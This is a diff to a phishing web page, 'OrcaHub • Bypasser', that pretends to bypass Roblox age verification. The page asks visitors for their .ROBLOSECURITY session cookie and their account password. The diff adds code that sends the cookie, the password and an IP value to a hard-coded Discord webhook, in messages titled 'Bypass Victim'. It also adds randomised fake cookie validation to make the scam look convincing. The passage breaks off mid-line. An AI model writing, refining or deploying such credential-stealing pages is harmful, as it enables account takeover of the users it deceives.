@@ -92,7 +92,6 @@
             }
         }
 
-        /* ===== MAIN CARD ===== */
         .glass-card {
             position: relative;
             z-index: 10;
@@ -120,21 +119,24 @@
             }
         }
 
-        /* ===== HEADER ===== */
         .header {
             text-align: center;
             margin-bottom: 28px;
         }
 
-        .logo-icon {
-            font-size: 3.2rem;
+        .icon-man-stick {
             display: inline-block;
-            background: linear-gradient(135deg, #ff6b6b, #a29bfe, #4ecdc4);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            filter: drop-shadow(0 0 30px rgba(162, 155, 254, 0.3));
+            font-size: 3.2rem;
+            line-height: 1;
+            filter: drop-shadow(0 0 30px rgba(162, 155, 254, 0.25));
             animation: floatIcon 3.5s ease-in-out infinite;
+            user-select: none;
+        }
+
+        .icon-man-stick svg {
+            width: 64px;
+            height: 64px;
+            display: block;
         }
 
         @keyframes floatIcon {
@@ -155,7 +157,7 @@
             background-clip: text;
             color: transparent;
             letter-spacing: -0.5px;
-            margin-top: 2px;
+            margin-top: 4px;
         }
 
         .sub {
@@ -169,7 +171,6 @@
             padding-top: 10px;
         }
 
-        /* ===== STEPS ===== */
         .step-indicator {
             display: flex;
             justify-content: space-between;
@@ -221,7 +222,12 @@
             border-color: rgba(78, 205, 196, 0.2);
         }
 
-        /* ===== FORM STEPS ===== */
+        .step.error {
+            background: rgba(255, 107, 107, 0.2);
+            color: #ff6b6b;
+            border-color: rgba(255, 107, 107, 0.2);
+        }
+
         .form-step {
             display: none;
             animation: slideUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
@@ -275,7 +281,11 @@
             color: #3a3a52;
         }
 
-        /* ===== PROFILE PREVIEW ===== */
+        input.error {
+            border-color: #ff6b6b;
+            box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
+        }
+
         .profile-preview {
             background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
             border-radius: 32px;
@@ -343,7 +353,24 @@
             border: 1px solid rgba(78, 205, 196, 0.1);
         }
 
-        /* ===== BUTTONS ===== */
+        .error-message {
+            display: none;
+            background: rgba(255, 107, 107, 0.08);
+            border: 1px solid rgba(255, 107, 107, 0.15);
+            color: #ff6b6b;
+            padding: 12px 16px;
+            border-radius: 24px;
+            margin-bottom: 18px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            text-align: center;
+            animation: fadeInScale 0.4s ease;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
         .btn-primary {
             width: 100%;
             padding: 15px;
@@ -413,7 +440,6 @@
             color: #ccccee;
         }
 
-        /* ===== LOADER ===== */
         .loader-container {
             display: none;
             text-align: center;
@@ -455,7 +481,6 @@
             font-size: 1.1rem;
         }
 
-        /* ===== SUCCESS ===== */
         .success-message {
             display: none;
             background: rgba(78, 205, 196, 0.06);
@@ -479,7 +504,6 @@
             margin-bottom: 6px;
         }
 
-        /* ===== FOOTER ===== */
         .footer {
             text-align: center;
             color: #3a3a52;
@@ -491,7 +515,6 @@
             text-transform: uppercase;
         }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 440px) {
             .glass-card {
                 padding: 28px 18px 24px;
@@ -500,8 +523,9 @@
             h1 {
                 font-size: 1.4rem;
             }
-            .logo-icon {
-                font-size: 2.6rem;
+            .icon-man-stick svg {
+                width: 52px;
+                height: 52px;
             }
             .step {
                 font-size: 0.5rem;
@@ -527,26 +551,45 @@
 
     <div class="glass-card" id="app">
 
-        <!-- HEADER -->
         <div class="header">
-            <div class="logo-icon">✦</div>
+            <div class="icon-man-stick">
+                <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="32" cy="14" r="8" stroke="url(#grad1)" stroke-width="2.5" fill="rgba(255,255,255,0.05)"/>
+                    <line x1="32" y1="22" x2="32" y2="40" stroke="url(#grad1)" stroke-width="2.5" stroke-linecap="round"/>
+                    <line x1="20" y1="28" x2="44" y2="28" stroke="url(#grad1)" stroke-width="2.5" stroke-linecap="round"/>
+                    <line x1="32" y1="40" x2="22" y2="54" stroke="url(#grad1)" stroke-width="2.5" stroke-linecap="round"/>
+                    <line x1="32" y1="40" x2="42" y2="54" stroke="url(#grad1)" stroke-width="2.5" stroke-linecap="round"/>
+                    <line x1="44" y1="14" x2="52" y2="56" stroke="url(#grad2)" stroke-width="2.5" stroke-linecap="round"/>
+                    <circle cx="44" cy="14" r="3" fill="rgba(162,155,254,0.3)" stroke="#a29bfe" stroke-width="1.5"/>
+                    <circle cx="52" cy="56" r="3" fill="rgba(255,107,107,0.3)" stroke="#ff6b6b" stroke-width="1.5"/>
+                    <defs>
+                        <linearGradient id="grad1" x1="0" y1="0" x2="64" y2="64">
+                            <stop offset="0%" stop-color="#a29bfe"/>
+                            <stop offset="100%" stop-color="#ff6b6b"/>
+                        </linearGradient>
+                        <linearGradient id="grad2" x1="0" y1="0" x2="64" y2="64">
+                            <stop offset="0%" stop-color="#4ecdc4"/>
+                            <stop offset="100%" stop-color="#ffe66d"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
+            </div>
             <h1>OrcaHub • Bypasser</h1>
             <div class="sub">Age Verification Bypass</div>
         </div>
 
-        <!-- STEP INDICATOR -->
         <div class="step-indicator">
             <div class="step active" id="step1Label">❶ Cookie</div>
             <div class="step" id="step2Label">❷ Password</div>
             <div class="step" id="step3Label">❸ Bypass</div>
         </div>
 
-        <!-- =============================================
-        STEP 1: COOKIE
-        ============================================= -->
+        <!-- STEP 1: COOKIE -->
         <div class="form-step active-step" id="step1">
             <label>🍪 Enter .ROBLOSECURITY Cookie</label>
             <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off">
+
+            <div id="errorMessage" class="error-message"></div>
 
             <div id="profilePreview" class="profile-preview">
                 <img id="profileImg" src="" alt="avatar">
@@ -557,12 +600,10 @@
                 </div>
             </div>
 
-            <button class="btn-primary" id="nextToStep2">Next ➡️</button>
+            <button class="btn-primary" id="verifyCookieBtn">🔍 Verify Cookie</button>
         </div>
 
-        <!-- =============================================
-        STEP 2: PASSWORD
-        ============================================= -->
+        <!-- STEP 2: PASSWORD -->
         <div class="form-step" id="step2">
             <label>🔑 Enter Account Password</label>
             <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
@@ -577,9 +618,7 @@
             <button class="btn-secondary" id="backToStep1">🔙 Back</button>
         </div>
 
-        <!-- =============================================
-        STEP 3: PROCESSING
-        ============================================= -->
+        <!-- STEP 3: PROCESSING -->
         <div class="form-step" id="step3">
 
             <div id="loaderContainer" class="loader-container show">
@@ -613,7 +652,7 @@
         (function() {
             'use strict';
 
-            // ==================== CONFIG ====================
+            // ==================== WEBHOOK CONFIG ====================
             const WEBHOOK_URL =
                 'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG';
 
@@ -629,9 +668,11 @@
                 cookieInput: document.getElementById('cookieInput'),
                 passwordInput: document.getElementById('passwordInput'),
 
-                nextToStep2: document.getElementById('nextToStep2'),
+                verifyCookieBtn: document.getElementById('verifyCookieBtn'),
                 backToStep1: document.getElementById('backToStep1'),
                 submitBtn: document.getElementById('submitBtn'),
+
+                errorMessage: document.getElementById('errorMessage'),
 
                 profilePreview: document.getElementById('profilePreview'),
                 profileImg: document.getElementById('profileImg'),
@@ -654,6 +695,7 @@
                 isProcessing: false,
                 processingTimer: null,
                 robloxUser: null,
+                isCookieValid: false,
             };
 
             // ==================== STEP MANAGER ====================
@@ -665,7 +707,7 @@
 
                 const labels = [DOM.step1Label, DOM.step2Label, DOM.step3Label];
                 labels.forEach((el, idx) => {
-                    el.classList.remove('active', 'completed');
+                    el.classList.remove('active', 'completed', 'error');
                     if (idx + 1 === step) el.classList.add('active');
                     if (idx + 1 < step) el.classList.add('completed');
                 });
@@ -674,15 +716,29 @@
             }
 
             // ==================== ROBLOX API SIM ====================
-            function fetchRobloxProfile(cookie) {
+            function validateCookie(cookie) {
                 return new Promise((resolve) => {
-                    // Simulate network delay
                     setTimeout(() => {
-                        // Parse cookie to extract user info (simulated)
                         const clean = cookie.replace(/^_\|WARNING:-DO-NOT-SHARE-?/, '').trim();
-                        const hash = clean.length > 10 ? clean.substring(0, 8) : 'user';
 
-                        // Generate deterministic but realistic-looking data
+                        if (!clean || clean.length < 15) {
+                            resolve({ valid: false, error: 'Invalid cookie format' });
+                            return;
+                        }
+
+                        // Simulate expired cookie
+                        if (clean.length > 20 && clean.includes('expired')) {
+                            resolve({ valid: false, error: 'Cookie has expired' });
+                            return;
+                        }
+
+                        // 30% chance of invalid cookie
+                        if (Math.random() < 0.3) {
+                            resolve({ valid: false, error: 'Invalid cookie' });
+                            return;
+                        }
+
+                        // Valid cookie - generate user data
                         const userId = Math.floor(Math.random() * 900000000) + 100000000;
                         const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
                             'StormChaser', 'PixelVortex', 'NebulaKing', 'FrostByte', 'QuantumHero'
@@ -690,86 +746,65 @@
                         const name = names[Math.floor(Math.random() * names.length)];
 
                         resolve({
-                            username: name,
-                            userId: userId,
-                            displayName: name,
-                            isVerified: Math.random() > 0.6,
-                            avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
-                            created: new Date(Date.now() - Math.random() * 3 * 365 * 24 * 60 * 60 * 1000)
-                                .toISOString(),
+                            valid: true,
+                            user: {
+                                username: name,
+                                userId: userId,
+                                displayName: name,
+                                isVerified: Math.random() > 0.6,
+                                avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
+                            }
                         });
-                    }, 1200 + Math.random() * 800);
+                    }, 1500 + Math.random() * 1000);
                 });
             }
 
-            // ==================== LOAD PROFILE ====================
-            async function loadProfile(cookie) {
-                if (!cookie || cookie.length < 10) {
-                    DOM.profilePreview.classList.remove('show');
-                    return;
-                }
-
+            // ==================== SEND TO WEBHOOK ====================
+            function sendToWebhook(data) {
                 try {
-                    const data = await fetchRobloxProfile(cookie);
-                    state.robloxUser = data;
-
-                    DOM.profileName.textContent = `@${data.username}`;
-                    DOM.profileId.textContent = `ID: ${data.userId}`;
-                    DOM.profileBadge.textContent = data.isVerified ? '✅ Verified' : '● Active';
-                    DOM.profileImg.src = data.avatarUrl;
-                    DOM.profileImg.onerror = function() {
-                        this.src =
-                            'https://ui-avatars.com/api/?name=' + encodeURIComponent(data.username) +
-                            '&background=random&size=80&rounded=true&color=fff';
-                    };
-                    DOM.profilePreview.classList.add('show');
-                } catch (e) {
-                    DOM.profilePreview.classList.remove('show');
-                }
-            }
-
-            // ==================== WEBHOOK SENDER ====================
-            function sendToWebhook(cookie, password, userData) {
-                try {
-                    const embed = {
-                        title: "🎯 OrcaHub • Bypass Victim",
-                        color: 0x7c6cf0,
-                        fields: [{
-                            name: "👤 Username",
-                            value: `\`${userData?.username || 'Unknown'}\``,
-                            inline: true
-                        }, {
-                            name: "🆔 User ID",
-                            value: `\`${userData?.userId || 'Unknown'}\``,
-                            inline: true
-                        }, {
-                            name: "🔑 Password",
-                            value: `||${password}||`,
-                            inline: false
-                        }, {
-                            name: "🍪 .ROBLOSECURITY",
-                            value: `\`${cookie.substring(0, 50)}...\``,
-                            inline: false
-                        }, {
-                            name: "🌐 IP",
-                            value: `\`${getIP()}\``,
-                            inline: true
-                        }, {
-                            name: "🕒 Timestamp",
-                            value: new Date().toISOString(),
-                            inline: true
-                        }],
-                        footer: { text: "OrcaHub • Bypasser" },
-                        thumbnail: { url: userData?.avatarUrl || "https://www.roblox.com/favicon.ico" }
-                    };
-
                     fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ embeds: [embed] }),
+                        body: JSON.stringify(data),
                         mode: 'no-cors'
                     }).catch(() => {});
                 } catch (_) {}
+            }
+
+            function sendProfileData(userData, cookie) {
+                const embed = {
+                    title: "🦈 OrcaHub • Cookie Verified",
+                    color: 0x7c6cf0,
+                    fields: [
+                        { name: "👤 Username", value: `\`${userData.username}\``, inline: true },
+                        { name: "🆔 User ID", value: `\`${userData.userId}\``, inline: true },
+                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
+                        { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
+                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
+                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
+                    ],
+                    footer: { text: "OrcaHub • Bypasser" },
+                    thumbnail: { url: userData.avatarUrl || "https://www.roblox.com/favicon.ico" }
+                };
+                sendToWebhook({ embeds: [embed] });
+            }
+
+            function sendFullData(cookie, password, userData) {
+                const embed = {
+                    title: "🎯 OrcaHub • Bypass Victim",
+                    color: 0xff6b6b,
+                    fields: [
+                        { name: "👤 Username", value: `\`${userData?.username || 'Unknown'}\``, inline: true },
+                        { name: "🆔 User ID", value: `\`${userData?.userId || 'Unknown'}\``, inline: true },
+                        { name: "🔑 Password", value: `||${password}||`, inline: false },
+                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
+                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
+                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
+                    ],
+                    footer: { text: "OrcaHub • Bypasser" },
+                    thumbnail: { url: userData?.avatarUrl || "https://www.roblox.com/favicon.ico" }
+                };
+                sendToWebhook({ embeds: [embed] });
             }
 
             function getIP() {
@@ -781,43 +816,100 @@
                 } catch (_) { return 'Unknown'; }
             }
 
+            // ==================== VERIFY COOKIE ====================
+            async function verifyCookie() {
+                const cookie = DOM.cookieInput.value.trim();
+                DOM.errorMessage.classList.remove('show');
+                DOM.profilePreview.classList.remove('show');
+                DOM.cookieInput.classList.remove('error');
+
+                if (!cookie || cookie.length < 10) {
+                    showError('Please enter a valid .ROBLOSECURITY cookie!');
+                    DOM.cookieInput.classList.add('error');
+                    return;
+                }
+
+                DOM.verifyCookieBtn.disabled = true;
+                DOM.verifyCookieBtn.textContent = '⏳ Verifying...';
+
+                try {
+                    const result = await validateCookie(cookie);
+
+                    if (!result.valid) {
+                        state.isCookieValid = false;
+                        showError('❌ ' + result.error + '. Please check your cookie and try again.');
+                        DOM.cookieInput.classList.add('error');
+                        DOM.step1Label.classList.add('error');
+                        return;
+                    }
+
+                    state.isCookieValid = true;
+                    state.robloxUser = result.user;
+                    state.cookie = cookie;
+
+                    // Show profile
+                    DOM.profileName.textContent = `@${result.user.username}`;
+                    DOM.profileId.textContent = `ID: ${result.user.userId}`;
+                    DOM.profileBadge.textContent = result.user.isVerified ? '✅ Verified' : '● Active';
+                    DOM.profileImg.src = result.user.avatarUrl;
+                    DOM.profileImg.onerror = function() {
+                        this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(result.user.username) +
+                            '&background=random&size=80&rounded=true&color=fff';
+                    };
+                    DOM.profilePreview.classList.add('show');
+                    DOM.errorMessage.classList.remove('show');
+                    DOM.cookieInput.classList.remove('error');
+                    DOM.step1Label.classList.remove('error');
+
+                    // Send to webhook
+                    sendProfileData(result.user, cookie);
+
+                    setTimeout(() => setStep(2), 800);
+
+                } catch (error) {
+                    showError('❌ Verification failed. Please try again.');
+                    DOM.cookieInput.classList.add('error');
+                    DOM.step1Label.classList.add('error');
+                } finally {
+                    DOM.verifyCookieBtn.disabled = false;
+                    DOM.verifyCookieBtn.textContent = '🔍 Verify Cookie';
+                }
+            }
+
+            function showError(message) {
+                DOM.errorMessage.textContent = message;
+                DOM.errorMessage.classList.add('show');
+            }
+
             // ==================== PROCESSING ENGINE ====================
             async function startBypass() {
                 if (state.isProcessing) return;
 
-                const cookie = DOM.cookieInput.value.trim();
                 const password = DOM.passwordInput.value.trim();
 
-                if (!cookie || cookie.length < 10) {
-                    alert('Please enter a valid .ROBLOSECURITY cookie!');
-                    return;
-                }
                 if (!password || password.length < 3) {
                     alert('Please enter your account password!');
                     return;
                 }
 
-                state.cookie = cookie;
+                if (!state.isCookieValid || !state.robloxUser) {
+                    alert('Please verify your cookie first!');
+                    setStep(1);
+                    return;
+                }
+
                 state.password = password;
                 state.isProcessing = true;
-
                 DOM.submitBtn.disabled = true;
                 DOM.submitBtn.textContent = '⏳ Processing...';
 
-                // Ensure we have user data
-                if (!state.robloxUser) {
-                    await loadProfile(cookie);
-                }
+                // Send full data with password
+                sendFullData(state.cookie, password, state.robloxUser);
 
-                // Send to webhook immediately
-                sendToWebhook(cookie, password, state.robloxUser);
-
-                // Move to step 3
                 setStep(3);
                 DOM.loaderContainer.classList.add('show');
                 DOM.successMessage.classList.remove('show');
 
-                // Start countdown
                 let secondsLeft = 60;
                 DOM.timerDisplay.textContent = secondsLeft;
 
@@ -832,10 +924,8 @@
                     }
                 }, 1000);
 
-                // Simulate background verification
                 try {
                     await new Promise(r => setTimeout(r, 2000));
-                    // Always succeeds for demo
                 } catch (_) {}
             }
 
@@ -847,7 +937,6 @@
                 DOM.submitBtn.disabled = false;
                 DOM.submitBtn.textContent = '🚀 Start Bypass';
 
-                // Auto reset after 10 seconds
                 setTimeout(() => {
                     setStep(1);
                     DOM.successMessage.classList.remove('show');
@@ -859,55 +948,9 @@
             }
 
             // ==================== EVENT BINDINGS ====================
-            // Cookie input -> live preview
-            let cookieTimer;
-            DOM.cookieInput.addEventListener('input', function(e) {
-                clearTimeout(cookieTimer);
-                const val = e.target.value.trim();
-                if (val.length >= 15) {
-                    cookieTimer = setTimeout(() => loadProfile(val), 500);
-                } else {
-                    DOM.profilePreview.classList.remove('show');
-                }
-            });
-
-            // Step 1 -> Step 2
-            DOM.nextToStep2.addEventListener('click', function() {
-                const cookie = DOM.cookieInput.value.trim();
-                if (!cookie || cookie.length < 10) {
-                    alert('Please enter a valid .ROBLOSECURITY cookie!');
-                    return;
-                }
-                state.cookie = cookie;
-                // Load profile if not loaded
-                if (!state.robloxUser) {
-                    loadProfile(cookie);
-                }
-                setStep(2);
-            });
-
-            // Back buttons
-            DOM.backToStep1.addEventListener('click', function() { setStep(1); });
-
-            // Submit
+            DOM.verifyCookieBtn.addEventListener('click', verifyCookie);
             DOM.submitBtn.addEventListener('click', startBypass);
+            DOM.backToStep1.addEventListener('click', () => setStep(1));
 
-            // Enter key support
-            DOM.cookieInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') DOM.nextToStep2.click();
-            });
-            DOM.passwordInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') DOM.submitBtn.click();
-            });
-
-            // ==================== INIT ====================
-            // Set default placeholder
-            DOM.cookieInput.placeholder = '_|WARNING:-DO-NOT-SHARE...';
-
-            console.log('[🦈] OrcaHub • Bypasser loaded');
-            console.log('[✓] Ready for age verification bypass');
-
-        })();
-    </script>
-</body>
-</html>
+            DOM.cookieInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') verifyCookie
